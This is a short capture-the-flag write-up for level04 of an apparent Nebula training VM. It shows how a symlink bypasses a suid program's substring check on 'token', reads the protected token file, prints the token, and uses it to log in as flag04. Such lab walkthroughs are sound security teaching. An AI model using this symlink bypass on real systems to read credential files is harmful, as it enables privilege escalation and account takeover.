**Intro**

In this level, the the following code is presented 

```
if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }
```

The intent was to prevent the suid `flag04` binary from reading the flag04 `token` file.

Thankfully for me, it's only scanning the string input using the `strstr()` function.

[Symbolic links](https://en.wikipedia.org/wiki/Symbolic_link) are an effective way to bypass this restriction.

By creating a symlink with any text in the name other than *token* I can bypass the restriction in the code.

```
ln -s /home/flag04/token /tmp/foobar
﻿level04@nebula:/home/flag04$ ./flag04 /tmp/foobar
06508b5e-8909-4f38-b630-fdb148a848a2
```

Given the token I can now log into the flag04 account and capture the flag

```
﻿level04@nebula:/home/flag04$ su - flag04
Password: 
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
```